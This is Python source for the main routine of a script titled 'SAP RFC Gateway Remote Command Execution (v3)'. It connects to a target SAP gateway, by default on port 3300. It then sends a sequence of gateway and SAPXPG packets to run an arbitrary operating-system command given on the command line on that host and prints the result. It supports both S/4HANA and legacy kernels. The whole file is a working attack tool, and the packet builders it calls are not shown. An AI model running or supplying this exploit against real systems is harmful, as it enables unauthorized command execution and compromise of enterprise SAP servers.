def main():
    parser = argparse.ArgumentParser(
        description='SAP RFC Gateway Remote Command Execution (v3)',
        formatter_class=argparse.RawTextHelpFormatter,
    )
    parser.add_argument('-t', '--ip', required=True,
                        help='Target SAP system IP')
    parser.add_argument('-p', '--port', type=int, default=3300,
                        help='Gateway port (default: 3300)')
    parser.add_argument('-c', '--cmd', default='whoami',
                        help='Command to execute (default: whoami)')
    parser.add_argument('--protocol', choices=['modern', 'legacy'], default='modern',
                        help='Target SAP kernel protocol (default: modern)\n'
                             '  modern  - S/4HANA systems (kernel 758/793)\n'
                             '  legacy  - Classic NW7.52 / R/3 systems')
    parser.add_argument('-s', '--sid', default=None, metavar='SID',
                        help='SAP System ID of the target (3 chars).\n'
                             'Default: A4H (modern) or NPL (legacy)')
    parser.add_argument('--appserver', default=None, metavar='HOSTNAME',
                        help='Application server hostname for TH routing.\n'
                             'Default: vhcala4hci (modern) or npl-sxpg (legacy).\n'
                             'Must match the app server registered on the target gateway.\n'
                             'Example: --sid NW7 --appserver myhost')
    parser.add_argument('-v', '--verbose', action='store_true',
                        help='Show connection steps and session details')
    parser.add_argument('-d', '--debug', action='store_true',
                        help='Show hex dumps of all packets')
    args = parser.parse_args()

    target_ip = args.ip
    target_port = args.port
    cmd = args.cmd
    protocol = args.protocol
    verbose = args.verbose or args.debug
    debug = args.debug

    # Apply protocol-specific defaults for sid and appserver
    if args.sid is None:
        sid = 'NPL' if protocol == 'legacy' else 'A4H'
    else:
        sid = args.sid[:3].upper()
    if args.appserver is None:
        appserver = 'npl-sxpg' if protocol == 'legacy' else 'vhcala4hci'
    else:
        appserver = args.appserver

    instance = f'{target_port - 3300:02d}' if 3300 <= target_port < 3400 else '00'

    try:
        client_ip = get_local_ip(target_ip)
    except Exception:
        client_ip = '127.0.0.1'

    if verbose:
        print(f'[*] Target: {target_ip}:{target_port} (instance {instance})')
        print(f'[*] Protocol: {protocol}')
        print(f'[*] Client: {client_ip}')
        print(f'[*] SID: {sid}  AppServer: {appserver}')
        print(f'[*] TH routing: {sid}/{appserver}_{sid}_00')
        print(f'[*] Command: {cmd}')

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(15)
    try:
        sock.connect((target_ip, target_port))
    except socket.error as e:
        print(f'[!] Connection failed: {e}', file=sys.stderr)
        sys.exit(1)

    try:
        # Step 1: GW_NORMAL_CLIENT
        if verbose:
            print('[+] Sending GW_NORMAL_CLIENT')
        p1 = build_gw_init(client_ip, instance)
        if debug:
            print(f'[DBG] P1 ({len(p1)} bytes):')
            hexdump(p1, '      ')
        ni_send(sock, p1)
        resp = ni_recv(sock)
        if debug:
            print(f'[DBG] GW response ({len(resp)} bytes):')
            hexdump(resp, '      ')

        # Step 2: F_SAP_INIT
        if verbose:
            print('[+] Sending F_SAP_INIT')
        if protocol == 'legacy':
            p2 = build_sap_init_npl(client_ip, target_ip, sid=sid)
        else:
            p2 = build_sap_init(P2_TEMPLATE, client_ip, target_ip, sid=sid)
        if debug:
            print(f'[DBG] P2 ({len(p2)} bytes):')
            hexdump(p2, '      ')
        ni_send(sock, p2)
        resp = ni_recv_handle_ping(sock)
        if debug:
            print(f'[DBG] INIT response ({len(resp)} bytes):')
            hexdump(resp, '      ')

        err = check_response_error(resp)
        if err:
            print(f'[!] Error in INIT response: {err}', file=sys.stderr)
            sys.exit(1)

        conv_id, pte = extract_p2_info(resp)
        if verbose:
            print(f'[+] Got conv_id: {conv_id}  PTE: {pte.hex()}')

        # Step 3: F_SAP_SEND START (SAPXPG_START_XPG_LONG)
        if verbose:
            print('[+] Sending SAPXPG_START_XPG_LONG')
        if protocol == 'legacy':
            p3 = build_sap_send_start_npl(conv_id, cmd, pte, sid=sid, appserver=appserver,
                                          client_ip=client_ip, target_ip=target_ip)
        else:
            p3 = build_sap_send_start(conv_id, cmd, pte, sid=sid, appserver=appserver)
        if debug:
            print(f'[DBG] P3 ({len(p3)} bytes):')
            hexdump(p3, '      ')
        ni_send(sock, p3)
        start_resp = ni_recv_handle_ping(sock)
        if debug:
            print(f'[DBG] START response ({len(start_resp)} bytes):')
            hexdump(start_resp, '      ')

        err = check_response_error(start_resp)
        if err:
            print(f'[!] Error in START response: {err}', file=sys.stderr)
            if debug:
                print(f'[DBG] START response ({len(start_resp)} bytes):')
                hexdump(start_resp, '    ')
            sys.exit(1)

        # Step 4: F_SAP_SEND END (SAPXPG_END_XPG)
        if verbose:
            print('[+] Sending SAPXPG_END_XPG')
        if protocol == 'legacy':
            p4 = build_sap_send_end_npl(conv_id, pte)
        else:
            p4 = build_sap_send_end(conv_id, pte)
        if debug:
            print(f'[DBG] P4 ({len(p4)} bytes):')
            hexdump(p4, '      ')
        ni_send(sock, p4)
        resp = ni_recv_handle_ping(sock)
        if debug:
            print(f'[DBG] END response ({len(resp)} bytes):')
            hexdump(resp, '      ')

        # Step 5: Parse and display output
        err = check_response_error(resp)
        if err:
            print(f'[!] Error in END response: {err}', file=sys.stderr)
            if debug:
                print(f'[DBG] END response ({len(resp)} bytes):')
                hexdump(resp, '    ')
            sys.exit(1)

        output = extract_output(resp, debug=debug)
        if output is not None:
            print(output)
        else:
            # Check if this is the compressed format without pysapcompress
            if b'\x03\x02\x03\x05' in resp and not _HAS_PYSAPCOMPRESS:
                print('[!] Output is SAP LZH compressed (large output). '
                      'Install pysapcompress: pip install pysapcompress',
                      file=sys.stderr)
            else:
                print('[!] No output received (command may have failed or produced no output)',
                      file=sys.stderr)
            if verbose:
                print(f'[!] START response ({len(start_resp)} bytes):')
                hexdump(start_resp, '    ')
                print(f'[!] END response ({len(resp)} bytes):')
                hexdump(resp, '    ')

    except ConnectionError as e:
        print(f'[!] Connection error: {e}', file=sys.stderr)
        sys.exit(1)
    except Exception as e:
        print(f'[!] Error: {e}', file=sys.stderr)
        if debug:
            import traceback
            traceback.print_exc()
        sys.exit(1)
    finally:
        sock.close()


if __name__ == '__main__':
    main()
